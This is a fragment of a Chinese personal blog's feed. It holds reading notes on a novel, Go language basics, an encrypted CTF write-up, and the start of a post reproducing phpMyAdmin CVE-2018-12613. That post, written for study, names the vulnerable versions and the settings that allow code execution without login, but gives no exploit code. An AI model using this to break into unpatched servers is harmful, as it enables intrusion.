class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>读书笔记总篇</title>
      <link href="2021/06/01/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E6%80%BB%E7%AF%87/"/>
      <url>2021/06/01/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E6%80%BB%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="技术类书籍"><a href="#技术类书籍" class="headerlink" title="技术类书籍"></a>技术类书籍</h1><p>技术类没怎么看过书，一般都是看大师傅们的博客来学习。</p><h1 id="小说类书籍"><a href="#小说类书籍" class="headerlink" title="小说类书籍"></a>小说类书籍</h1><h2 id="2021年"><a href="#2021年" class="headerlink" title="2021年"></a>2021年</h2><h3 id="文城-——余华"><a href="#文城-——余华" class="headerlink" title="文城  ——余华"></a>文城  ——余华</h3><ol><li>第一次读<code>2021年8月1日 — 2021年8月2日</code></li></ol><p><img src="/2021/06/01/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E6%80%BB%E7%AF%87/image-20210802225140518.png" alt></p><p>​    感觉整篇小说应该算是悲剧吧，非专业的角度说，因为我喜欢的角色都死了，男女主角就是林祥福跟小美吧，也许是先入为主，我总感觉小美跟林祥福最配，后面写的补的内容更详细地站在了小美的角度讲述的故事让人更伤感了，还好我读的快，只用了四个小时左右的时间看完了整本书，到后面越来越快，补的那些内容我只用了一个小时左右的时间。</p><p>​    讲的故事呢，也很生动。像我这种读网络小说的屌丝看着都不费劲，比一些故意把文章写得晦涩难懂的好得多，嘿嘿。全篇文章描述最多的女性角色小美感觉特别好，真的特别好。</p><p>​    我也不会总结，也不会记录，索性就把现在想到的内容写下来就算了。</p><blockquote><p>车轮的声响远去时，田氏兄弟说话的声音也在远去，他们计算着日子，要在正月初一前把大哥和少爷送回家中。</p></blockquote><p>最后林祥福死后棺材经过小美与阿强埋身的地方更让人觉得难以呼吸。。。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>哲思篇</title>
      <link href="2021/06/01/%E5%93%B2%E6%80%9D/"/>
      <url>2021/06/01/%E5%93%B2%E6%80%9D/</url>
      
        <content type="html"><![CDATA[<h2 id="梦境与现实"><a href="#梦境与现实" class="headerlink" title="梦境与现实"></a>梦境与现实</h2><p>梦境与现实一直以来都是值得展开讨论的话题，首先是梦与现实的相关性。</p><p>这方面西方的弗洛伊德和荣格研究得更深一点，中国的庄周梦蝶(我所知实在浅薄，竟不足以列出第二个人，但是几千年肯定有无数人思考研究过)，这里只是列出西方的两人的观念”师夷长技以制夷“。</p><p>西格蒙德·弗洛伊德：</p><p>不会总结，到此结束。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 简单思考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE复现总刊</title>
      <link href="2021/06/01/CVE%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/"/>
      <url>2021/06/01/CVE%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>复现一些近年来的cve学习一下</p><h1 id="2018"><a href="#2018" class="headerlink" title="2018"></a>2018</h1><h2 id="PHPMYADMIN-CVE-2018-12613"><a href="#PHPMYADMIN-CVE-2018-12613" class="headerlink" title="[PHPMYADMIN]CVE-2018-12613"></a>[PHPMYADMIN]CVE-2018-12613</h2><p><strong>TAG: 文件包含漏洞、PhpMyAdmin写入Shell</strong></p><p>因为phpmyadmin本身也是用php来写的，所以php的一些漏洞在phpmyadmin里面也是可能出现的，这里就是一个简单的文件包含漏洞。</p><blockquote><p>一个攻击者可以在服务器上包含（查看和潜在执行）文件的漏洞被发现。</p><p>该漏洞来自一部分代码，其中页面在phpMyAdmin中被重定向和加载，以及对白名单页面进行不正确的测试。</p><p>攻击者必须经过身份验证，但在这些情况下除外：</p><ul><li>$ cfg [‘AllowArbitraryServer’] = true：攻击者可以指定他/她已经控制的任何主机，并在phpMyAdmin上执行任意代码</li><li>$ cfg [‘ServerDefault’] = 0：这会绕过登录并在没有任何身份验证的情况下运行易受攻击的代码</li></ul></blockquote><p>就是说只要你可以登录这个版本的phpmyadmin的话，就都可以实现任意代码执行。下面看一下审计代码的过程。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>phpMyAdmin 4.8.0和4.8.1</p>]]></content>
      
      
      
        <tags>
            
            <tag> cve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang学习笔记</title>
      <link href="2021/05/30/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>2021/05/30/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/05/30/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210530234831511.png" alt></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>随着技术的发展，好像说python越来越力不从心了。虽然python的语言格式十分简洁，代码也容易理解，本来我想做一个pythonista的来着，但是看群里都在讨论go语言这种新技术(对于我来说是新技术)，就想了解了解学一下看看go语言的优缺，看哪门语言更适合作为工具语言(语言被开发出来就是作为工具要用的)。PS：其实是总是听说go语言比python好(个人感觉就是好像在瞎吹一样)，想来看看到底好在哪里。</p><p><strong>主要在最近学习python开发之余学一学golang，现在的我也还没资格深入进去</strong></p><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>直接下个GoLand就行了，sdk这个ide会自己给你安装好的，也省得配置环境了，到现在为止还没有发现什么错误。社区版的应该就足够一般化的使用了。</p><h2 id="Go-是编译型语言"><a href="#Go-是编译型语言" class="headerlink" title="Go 是编译型语言"></a>Go 是编译型语言</h2><p>Go 使用编译器来编译代码。编译器将源代码编译成二进制（或字节码）格式；在编译代码时，编译器检查错误、优化性能并输出可在不同平台上运行的二进制文件。要创建并运行 Go 程序，程序员必须执行如下步骤。</p><ol><li>使用文本编辑器创建 Go 程序；</li><li>保存文件；</li><li>编译程序；</li><li>运行编译得到的可执行文件。</li></ol><p>这不同于 Python、Ruby 和 JavaScript 等语言，它们不包含编译步骤。Go 自带了编译器，因此无须单独安装编译器。</p><h2 id="Go特点"><a href="#Go特点" class="headerlink" title="Go特点"></a>Go特点</h2><p>快速编译，高效执行，易于开发。</p><p>Go语言支持交叉编译，比如说你可以在运行 Linux 系统的计算机上开发可以在 Windows 上运行的应用程序。这是第一门完全支持 UTF-8 的编程语言，这不仅体现在它可以处理使用 UTF-8 编码的字符串，就连它的源码文件格式都是使用的 UTF-8 编码。Go语言做到了真正的国际化！</p><h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><h2 id="Go语言中的变量"><a href="#Go语言中的变量" class="headerlink" title="Go语言中的变量"></a>Go语言中的变量</h2><h3 id="空值"><a href="#空值" class="headerlink" title="空值"></a>空值</h3><p>布尔类型：false</p><p>int类型  ：0</p><p>string类型：””</p><p>其他类型：nil</p><p>这里的其他类型官方文档给的解释是<code>Type must be a pointer, channel, func, interface, map, or slice type</code>。</p><p>也就是说必须是这六种类型<code>pointer, channel, func, interface, map, slice</code></p><h3 id="变量的声明"><a href="#变量的声明" class="headerlink" title="变量的声明"></a>变量的声明</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> i <span class="token builtin">int</span>    <span class="token keyword">var</span> f <span class="token builtin">float64</span>    <span class="token keyword">var</span> b <span class="token builtin">bool</span>    <span class="token keyword">var</span> s <span class="token builtin">string</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%v %v %v %q\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> f<span class="token punctuation">,</span> b<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>声明方式有下面的两种，即</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">var</span> value1 <span class="token keyword">type</span> <span class="token operator">=</span> value2  或   <span class="token keyword">var</span> value1 <span class="token operator">=</span> value2value1 <span class="token operator">:=</span> value2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>但是上面的语句都是声明语句，在变量的生存周期内，变量只能被声明一次，这时只能用赋值操作<code>=</code>来改变变量的值，千万不要以为<code>:=</code>是赋值语句，这个只是一个简写的声明语句而已。</p>]]></content>
      
      
      
        <tags>
            
            <tag> GoLang </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021年各比赛wp</title>
      <link href="2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/"/>
      <url>2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="06189bbc759c4d2e74ca3b5f460835266f0cf798c841e387a2732e25d100530f">e9aa9de1755d76415015a78ee6f69518b1fb8a8a6f0670f9599dfd22f17bb3062e2d93a0a0d2d87319b56b9765fecadfbb14ea5901052b17f0fe4cda58bd41006cfd71b12c288c1a820a32df6cb1175755892a33a8d5bd4e2f26c364ef2ac29ecfe20ac1291abefba260d017e7a77b6504e6568edc7786cbe4169e37ae92061d7e1459820c2c14bbd9672aac37e502873d7603f6f13274ce41fbe7c59ccb85c9fa0b24a21823867162c4231874dce56b81dd38d2ca1649ed2b630a10dc575559ca608900e95735d7b3923e25e53df43b2c4c03179d7f8dc514bde096873e977718abf85fa006755ebf5139411fe1baff18e7a62f3a15677087bbe9fb03c00ac4f46a4cfd67d9be3623fc89dfdc504cc4b7955d6834612f5c5e46fe62699d27c96f724fd9699448104d155684b34b7a42250b24fdd065bcbec40898e3d7f6ff6e84a4923649021ea182293930e4c21898dd60554bd73d6fa20972ff2ba0f56105bd6b9268fe73bc6c49499e90acfb6797e5c7946a4c80f859003dc4e0a4cfd69682c0fd5f4b6110afe064edf866c03961178a45bafb1c8c1c29ed67efc715664b7d8fcee176b0d5453cef4ffcabb1ee3e60b02789c9a8705391ce59c9c29d17b6ef2a1fa59effadfa1f9b24bab4c9a7cbd81bc2c58001f70c351b54465c5619f9df88160843b2b8f6d295e8c8db253868e056c343b8e4259ad48004807e3d6e48e7385ddc66cfb6fbddc143e0639933b3c220d23e0e0f144efe0a571331a47004113cf71f565d4563aa624273ca40b2cf5659950c013a1b7f9b1931c5a1728683bc84a3ab1b2d7f496fcc59709354a232b9e5b9369f04539b0e0961161abff3e093ee7a70291dd41efa314b77a4ede423db761874770eb3727755c51f0f298da3578a42ca93e7329cef0273657ab3e52391d4693257df9ed3c55280028b2e8fe1fd9050a22ec86b02631a2c42dc71e9e3e6446c90bcbba00760110c317783c197cc7413e32e98b765b70290ebd2f911b43b3f82108e600cddfbbe924d17bedc957e7673217ef3239ee19480fc8b34f2640be954f447685fe27ea3c5c6aad70e79c23c8725b244a67727b08ab78e7286ae23e02bee16dfe359a2b0a0b76692229b568fcfc8761d301ac99f527dc0aeec39f97bd1f2e7666a0d25b71c4618edc1900fa57b0d9a82591eafef11ed8fbb92cd50ec81279d2d3a307995b30b79427374c4e1d1eb905cfb6b31d7390cceec3eb9f92d258124a2fd4149dbdc617074af00d25e8aee600258abc798f88285219f36b269e9b04159b95c36567dda630cc279a47c59336b10a7bcebef6ba023ab309e19e2440fed011dce7f102afdff5a1b098373c37bd82d03323c7f59feeefc29111342fb042f1de3ebe79be813e15904c9c795290584bb3731b549fdcc0f1bb52c984f00fd0445906c49769392ddc5149cadef3a32d9a4ca51d73a5e0a1e22c891d73b6a325cf438c9d5fcb54b6f8246fa93f2d4b60c146b2835267e8c9e8da88c7df6f1090cf8ff3759dec873e68cdd5c7c966b7584341c4ad34b2bf77131fc292de7a44d76bb99f21b9601b146ab200722093d0d029e98e1d7753959ae55f5fde771b31e6f7dcfe8bbe8142c428006b32345de7b1a72ce546cb8d4e83896d033b35fefd70149ed6b13c97b27902eeaf5eb1b5c73e284919cff36373376a2122913b4098756561189e0e5aea8c61b3f583d44ee25d54f8ac622d509df9c3cb34f0cee13bd1b20fff6974799d38d1a7a5e432c7310307f562bb2d54f6c2f6494c70398c43e310a5afbac4286fb7939b098f3a3e9bf01a7601943ee847f2879cd41ecd9259c679dc79d591fc8cf734a9e7690947aa71d8035bd70f5461c046091fcf4ad8a46d6bc20430d8ce61dc07bbb72229cc8eaabb225ce292cafa403483cd360078673359ca5dba441605b468a1dadbd9056aeffaf99ce74baafd459dee246dae4582fc0bdac00b87e045587ff7399b2c9cb65b43d90fd014e4ea05889d9c88f58ecbce9dfca51e7628655adb904d1a324c2857b7f770ab807f9755c1245e4d8c47413a1126295a936096e2834b808dc3474e466799b176c30c8ffe117448d695c45730add41ac328f6d0ef69590f3d097ab2d411a113bd1e2097b7643178a3be5ff530be212da23e4fe78fbdf55cb4c9eeca9db56f212324995f48cdee5338f2beeec6415fe5bd127c92eccad1ba048632ad9f1f57acd79450a2bd5ae06359dedcd385ddc4b64062be39317c1403954aaea918f117b44ac808a903b45f188c7d85a6bdc96203a00c75427c2132bcd67423f8de4c09ff9b0c012d919ad93d33101199251aa1adcd568c2d0da86e0988bc14a6f5451c6cdc797ee92976db47eba03cd6cf12396fffe8a11a0c282b66ce273cdc0f52f3b44e8619ed486889776f47647773a24f2636c191177ab668be09e36ea24f964ff0ccad05870d0a4e3886bfa29d511cc34add9701e6d12384aad9b7e3e7d77b376b2e1ac9d63f005ec77f9e45d35556f4a799ef995f486b0deef3e01309bdb711faa0964b27d7aef0c7400ee09be989df4ac206ffda43f07fec4a900e30cc517e682eaa92619d41d4658a0f5146119667960a1d4f44eb741bf1126e0e106dda4bb68fa07a345124a018f80970059963b4cd6cf9b0f58b659b109fefc01f1be143a34db092885eaeb82a654ea4b05e57cd3cc2961de1c3828020ed614a988349afa35d4ad133d7ec2b2ea911a87c039a1b54371250a7a59f63631801ec5cf524fcb291d6de439fecc1de2baa0762dfbbe23f4dac8f21fff1c072cd9030f066f915a8a8abe55cad4754b003ce850c79f884d5359d0e87441e380afd8da6a93003cd9a599478afd901e2ac472c3e10dd73f9bc0a796e1d985b61cca023fdb8431f8eab721f3f648bff22a8e893a5d47624dbed93efb88b79347750536d5affb8dd6391077fe014cfc3780cf311a296e2d64a55bd2eb27c8172257393a63a635481667e78fadafdbf8aba27ab4d01b024d068cc1c80c900d8dc1196ab95aa6feff6316a5857c416bec9a1e1138bccc450ac7bba794d852a83b1fa6d9823976ec4142fb419413170c9cd48e9ec664b52f124470b5873b68da41d27661d39db9d417c013394385511ade4a9400b9235c5ce4e1bde63a7153a454a5829707e56c71e9979ad0c727e197064e8c1a0d1399b6cdca086c15261eff77720c6520b96d1d99262740cda9cce975425ec694af8c0f041a1aec009ed506e914b5b825854d428205725114dae369874a19ef9360c261699d4126b34db7c7b604de31ca4d097485407cd8c7e4cb4de71f119321ea6941cda1e6e3191e9081dc0d95160644cf09de6f5299fbb259b82a215366b628e1fdb5d0e607590ac87daa04555776d257794064cb84ee78e10f9b54bab25f9c37f4d32e4bb82b700c1556d5937f64f6ae1b802bb9388560ae4e7b0f0df6c5e6ca5094b6e4416a1ccac1f9d98dd970287bb68aafb576bfd4f7c368ec09926b867515976e46584a4d530f2aa47d2c236f3244db20021ce6400404ed96b7af6814c061d97149a706310239169bdbf211028477cac597b1c76585860edaf0cf284c71b5fa1715bbf68c7ecc9af60665621a092a704888294908189037a8a75b3fca060fdfca2174bf9a8432ac6361f0a8fb144eea6d398627e14b88a0020689f6f08a54fbfb5aa356ae7ff61438b0572fba43cbfacb921c1f610db258980f0e49f4d84dc37bcaabd018622a32e735e58efbabb2b0698c2e4d76650919a82d47bae64abaf72dc373da64ef3f083e63304f3ccd6a1fb7bcd67e548cf08ef18c36462768e0c30d875030670636485f66602977511e67cbfefd29dfb6dc09e406b0e8e498e17b126f4b5c090421f4a354842706e3fce19b7965c41c064b9808c9dc94d0cc8639d43b74afed847034c592799aa2ae7956326d5c66bc2bf527e5a1426f0057a7a1c5730b1390758598cf3bd72655f7130c9e04e64f9be5d4f52148439f2be68a21abcb33a15215c58a9278927bc7c453e08b661f99d08c181da686f7518cbb123c35656794811808f13185beb09081b9bdb83f7df881f18bf4d3213aa0b18f801cb8399a5e94c70a73ad41cc6c2065b3ceb9b7305270ba21f2460245d680a4bb2bebd9be0e535cc36567a638bac03509099cd2b667462174c3178fa4bc5a9fc4303eca1a1f881393a37612300a4287be3bd5d123a175df8830ec6fc67900d7d320ede1cc73591284ef6c84c43f6ab2f39786584151895651328edab2c58b6bf3b72f55e456983e3eac779867e9737041a505069d1da8810c1729b8078e24fccc659cc9e5c5c07148665c31f10072b1f3df75f53b4e83a7726970bf8af79848d71b1fb7bb6b70c47baec6de7836264fa3f0c713e310245f00953cc28296186ea76222bae1f257290091a4e110e4511b34c892c2ff4c2734dde3bdb36d11c05e4fd7f93a473c83562f006b7a262730937f2666523e51fd73906856751a32f2b3dfcc11861faefa0cd995cbd9a3448bc755e0c3dbf3c5c741f2237a2d1a2bc07e5748d74dbd56f41a57d759512dccc948d6bf02cfb803a071ae7fd2dce3c011656bdaa5dbace2d7bb0045406bd9c0f5c4944360f18142d4b74826cf900df0f485103f376ea6419967d9c3f8b4477f9569fb86e9e2e4c41bf6b4058b0b7e391789a4c1793a9204bcf62bc4230264de4ae6ad62add54fef15fd161f6f96bd3fbd997593139c1da7e63b7781c4a8d3c53b38544d284142f0eec803df6e19f411a7f312ab12929caa7bf21acb202e5b9e05bcf7a2b0303eafa2e1665caf9db8ffa270c1c7d5c6cf580284f92d4e42211e6c3d4a109a3454ab7e9a5d598b8c195f5356b7f642d23a214e0de31e3ffab2eb3063b2ec2af420e4b3c48980059e7dd30b6a2ccbd500b3929c0756f967033c2b4e3ba754ffbcab82d1ec87c60661d3fbf6c9646b9b543d3cb85f16c0080fe07d6a6ded4addb8420b55d23c2fc9930ca0ab096508899d1e49e190b516f1f68e28b434c4df1c57aec6862ef82f18186bc02498df717cec84c6e900ad24e4e683e5c399049c33a25e01b5e473db64893ff2a5274e50ffd86fbbf9ed6bd194d5e5dc84d5f0f461bbd6d783fcd4b6d77ab3b996da1f571245d174a22bc146fd9c4e8b4c97c5f3aca1a451a86664054830b200427a1d152d204f61dc68f37bfd8bad082cbcb65cb0e249d6a2606c75f5a362eca50975ae036239be240ef6d17d3b3ef04f1c3d2ad764ef3c07ba6c015243447e7d29a131146841111c590022986f62260e96943db556a02cf9642145908096d6247946f9223fa68dc3044a4c207b7beeda33a4c0171aca6141fb1c697c0f8fae9d5abb5de768e448495f2b84188424835bfdfd1792e014aa24729a9147b824e02d1e9cbffdfb372265832116dd1e206fec3cc34d3df1d00e72c4c5a45d4e7ab089b32a29f05e5fc0dd05c61f6f63d1804dd0da542b7bbb615a06d9d1ccfdd97d01eb732cb23d32e5d47bdeb529b477a1f670f5f57edb4bc03f22a51a7548537d4659dcf6122693778af9e1a7b725188c51da3be18a2ef769a73ff3ef0f061f60ee92cbf32fa81575f65f80fe395e71d3638e041363c2f56c34b2b59d73084227eb35e90b74da90ed3522b4447fde59c592300d7dbeccdefe20b91b3fb0bfaaea1eab79567b5fa07998c1a45d3bb5ea5dd896c610e3161e2535caa5e8d0b36c3c93731bc5ba3a0a0ec681e03890d500e8792ed5d8ccf0375c77412f1030abfb09f4075be25aef7420313269d435b83d55ea64d7e8d69b6f4646b3116e3ebd15cb0e829b06b1aacc9be09c2892f5488cd4cc746bf719d66d70b697e6ca66e2731143610ed4892a35298888971bf7985ee865a70b300becef9c2b8f023e30d6089800a2d5bfab50ab9049af26377dc430f4137aed140e3004d21234fa1f0847afdeeba54ac93339c3f58a69215570d65c234216bbe0127d1d374ce1f60f6acd4e0597fa6ea88d891ce374795ecd5db37eb14bc6b489d700714933825cfc828cd57a47cc735ca5307888a54a5557c7503031948a4920973e8839c22c54352e4a5f2d3f4bdd6e7673ae4bbcca9fddb6749ffcbf5ace6bc6c567f30101c028154b23765b42cca345dbb4f5bcda17a4b3a45d83b29fb9590e18048c727712be6f6243fad245c7d234521b02fb02348baeb7e1a1e366b9de68909d1035ae49712e97925042beee6eaed572b56753dc5bc93377ebe0bc4eee7ce3d3d962017ecd081d916b4c8be845d3c3a7b0de091031aecba84d7d4c054820a9fe683a3ce7bee8525e49b75d782f48f5ed0419939a070e326935fab348a5e7f3428db351953be550521bf39842c9b2424a916b428fcf61a4ff7e9c4a8fcd84f0f101c68c16623c8f441a647e5998c9634717d663a7bbb907aa5915967da1e5b3363866ab8b35dd32263df1980b6dfab49589e0d8ee7340b0882a13595f3a942abcf2cf22f0068cf333df7d54bd3bfa24563829094eec82aa4529586ecc9cdecad46c303a64cdd45d56b95b5db5aa1ce6e558f88b08ca3387d2b71e407df0c6b607cc2fc90e698c84585fd79267d4170d8b4a2d146abccb71a6f258e2694e82fb665389c16f80ab6dfdddb1babfc765751bf8fc97d553fb8911059ec2bf5f075d7498797db2e756c74afe8e5889a3d658d6a28cdb42d8cfd9d9785bbb3eef42b42f411d5721d5a0f87ebfac41ce8154def1227c12386fb16951844d1462590e1ccf52d0919cd76f317650d31ff2eb92b3ffc6503da690525826bb7eaa4e577f0454aa1ce40020d395fce3ae0ea6001e58d67525b5d56846ced1bccb8c5d0e28b61d7ad731649305600ff7f73a94ffedf6c3521eedfe7ac303bda95312e7e77d655321bf7433aa56efea87d999f164b7bb94fe78e18904064a94538cd6a9eb7a7905fa2b24807720763860cb576b4e0ec6669ea64228469d3f4d8a8e5d858524b5f7f520c93b64d2fd4fbd7369b7358cb53304d1bb55be1072dc2d2b6b20de06462ce766cad9f9b40c854b25b3b41f6b9d421ca63458fe558ab73d5aa0c65edbc5c0bdc7ae1af593c01d425d947b408f37809c0d9007ea9134051e860ba06452545f3c466e45ed35aad802de273770dd6a9268b27f7b18e2928d478412e8ad0f260cca1b420fbbe6e3a93acb11be1f1f4efd3b9f8b456a5bb2340e86c1a0d1a4e0a6cd327adf589707eeb976067f77d163bbf60d282f87267fd8cba9aa32e6f81b5998028c9cfb8f5bba2d8276b4d134800376bd1bde3f71e51e523a93c1549167e3060b71538ca7ff5543152353f50e58625db12919200608e373a08bbb4eb50f5d31a628601bb0410f93a4881dbc37cc4e1e66b56075739fe5cdf60138df81f5ab3a836685e5a5d00dc5f58ed434e4de43570fa794f04f71af3a5d47f9b6a106689b04089bddaaae626477191fa034ee032944894edf204d13dd0286b49173f4e09082c68f3f6344d1c1c6d6c397846ea56d81c9115365a83735a16e5438357a889394ccbafc70e489c140411b4e37aa59797266b9e847f4e767d2dffd28ae87c59c0e37d5a079e802abe586ec58a96d4a3deafccfd5dc1089dd389798cc85d539b7cc6742e198d5a33a9cb1cfd9ce13e746b2f32e7eb5c7ad4157967e543f2bf9a9593b58ea3177a04fc5fe3a67dfdf7b66a3a1bedd2cd2ed6205e3e8938738cd63767fc04f7e3c81c1153d5f64be03c2d08ad360f48afa472c58d1f8e2f8ed507ca059b23eddcd072765e2d5859f439549274c98467382d0085aaa842bbbf39dc1dcc5be612b8391971eae2de6ca281cad3f446083ac7426d2ebdac39ef091460f84435512320f04cc679ebdc384bfa56185add550bf8b28a4d744dbb70e54c1fdefbeefcdbec9834125e2403b510d9057a5176a0dd53a4c0eb78c7a045d6cdbed6fd97f2c631dcb05707f89ebbe026fc6e60c3b0b2afe12e47f84ef050d8149faa20e77f2d34eb7799e023a6b28037b5fa83a8bbe218a0258c6e8c6d35b326923fbe94e8376f0c25141a0f68b2c848c4027e3d9ec1716fda023115aa66bc5b63d332d500df11269729a7be3a35f1976e882c515ce8a628c99d204b3e7c4e3c53f5d75d7ee24712f0921f2a6ecbf0aaadf6c20f2f96f6daa3f5cbe47dc76854a327bfcd85648a625a4f04303f4d011ddf860a8ebacfbff773ea983338aff654fcef3dbc477090e918849b1c408036f42a9c7965e51f202c3a490406863910514d234e94b4a9b498cf3bf1ea7cd0ca6d4b47e618d0c222a7d19c664542c2168ea976550d20b9247f7989b3b4874134e7d3103639d7be7dae1e39f4a3007616d4728bbd40d769d0a392a3d9821d51204440d1a5d6c2ab00c55882b2353a325b1997c3463b69bb141b165cef79364e7e27c7279dea62ea807c1fda00cfac05b1243caf3f48933d2f6270705fddeb648cfd9e0f1fe10359f0e4751fd6bd0530b3935f86303dcd6053b0af5376445802239490d82c9982f76a6375cd9f165d9e5873cbdd9289976b4af3cb652903467c269aec012733563d12a00b4db982cc7311dad858cff266e0c4959a37a16c54f1a2ffa24c7f1a9836c3ad0cf2938e702cb4288490ab7adb0ea5a60ca925feb78956a6eda3242afd88f1a6e18e18442dc921b9fa55193e33922f31463b9431a5919946e7b8d46cb581bfb3f7c6ac5558de3ce3829c1757e0966b591b09aa67e1e6ccc5eb7ae1a68e8bab2e7778629e4e1c80f5d24c7a6ee57aedcdc873f89e5d81e6215ecd60422a424422356b53223219fa9f8cd3b03e73ab2d8154fae06a7f152d3c1c0c888ef4722270e7ebfc521c5c6971281e6ab9bf48aed0fcf7379141433aee1e889338f8e2edb764ab6990266d6bb0601f20583b3c48862d0d6d0d38ffdddab414fc6b838597043f9b71866b4600c5e71f9e6953a4d4e4e18e7a5dcbe75689b3cc8ef3444f500d028dd8ad443864f3ad7639d457a112913e2bc949bf7653ba93ba9edfc2d44d23831055158bb9fa6f10309b980c4aeb14e2fc87b2ef6559ed6b45bd24a5577335c6957c6a3011162061025b8562bf70e4cae2597abc3e6a8a2116adb037d1f79d3b71237732fcdd6326347740112a0f5021b5ce0b82ac13f13bcd2f7c6e4140d51af53f97e84c29aa924cffea392011a08930136e7cea2b1615789a65b6ce8bba29162a29164f87294d868ad35461c1b296d21eada8d2d24728bac3585de1139f599082acecf05ce65d3ab2cb058e5d90bdb2996c4d794171dd644b93f1f84d38de5c3fb99a70467b234311d7bfc1a79b0664381b4100687564e89e73787027084fcadc921519c0441ee99acb4bead558033501af9b145b0ed46e464cfacd2e9fa2f803fbc6eeefbb5e6a36c5856c42cd600b8663010672e98cd46b15c0aedeb0cf038f8d40d18da44c2853e624325f5829c9b97ca2a19b1a32b734d23798c546ad451fdd265e4423cb64091fd165ad577647532f39dcdc70b7f863fb34709da968718b95c47ff9b58be6b312f8fada1008feeb46b89f149e869bdb4d6e9d0aa9407c269d5029bbb1ac5f47bfe3830e30135fee7693cfe869f35ae6c500e028047d1d6b79c2a5da8cf74315bb56c81fcc4f68b947d6aa733f47c97e94ada30a9c0349f5fd345737032dd8aaf1cff435354887e52ed2adb76a8332ebfb92068c8369bded36300a3063cc9eee6e595c14be6cdd89ecbf92c25f5ffd85ad178136b8c74b987cbd0f6796858b9f1b783375b70c11bba36f1054ee92606b135416251bbef8cc37c8285859ece0d60b4649fb39b0f1d99c203d4467af7ca8dad44033a30d6fbaa32e33954355b770847087497432793e8d7199b4a53992c3c4cb559abf08ac81e631572fd204c0a4554e7339b63e89785d8e68ce77ead3cc1131e13a25184bebb9abbab7ae230a88ce1096c92e30414562ee4f33f8925f8b22bd925b80db660ad8646f339e2ffd4c6fde54444fe839d6248a9e54127c254aec68cea436b1c44be9b0b2ab18375d62c292cc653b2a83272b4abb2b4e892f1ff24803b11fd8a460a0cadb9cb04b410b8ce6caf143dc2617c69f50499232356ade79d4635517760b62b8623ac7019e9ec002b87d70a0f7d69e6fbce17a6ea1d35e4e2c2ef8c0bb1487699542818681537543bab8545b52c3d3cbab9e98ea5dd88c1eac97450db9a698733ae28361ad2a2360eb8fe659899ea1c27f95c63b3187c8bf6edf64b934b131b6b14b1b1926db0eed1de55cdc31b5a07e6e322a40200f0868890cc7343d6643f7ae057aabc3240671712202ab5dc9259e6001fea46059204cc82288bf004509a26d952ff9e6c856090a01d982cd4661c867e4c8da883a5eda3f7c0d4c617e616ff5e22b8992f658ad5831a0ef0e9b659e94758abb589412ef66ec9d1f5e7798bf794df3d7eeae315c2c30d8eb4fbe06ed1c06c013218d6404cd69eecad609655e2c6f322f651c45d220400915578c85aba9f876c28c90d3bc0881c5ebce594e6f259cb141b591c0bc9d048f905dbfdcb8187149ddb6092365157b3beacd764415036753359accca4ac708329265961b8f6576d0499c458a8c67aab0c6b3e49e4d59667a5b2b7646b747c26013b1f1679e946f8e62a017eb8f3f70c306e26be4056e013b2b1fc47fd2157dd63fcd8ca324fd217ce86d2c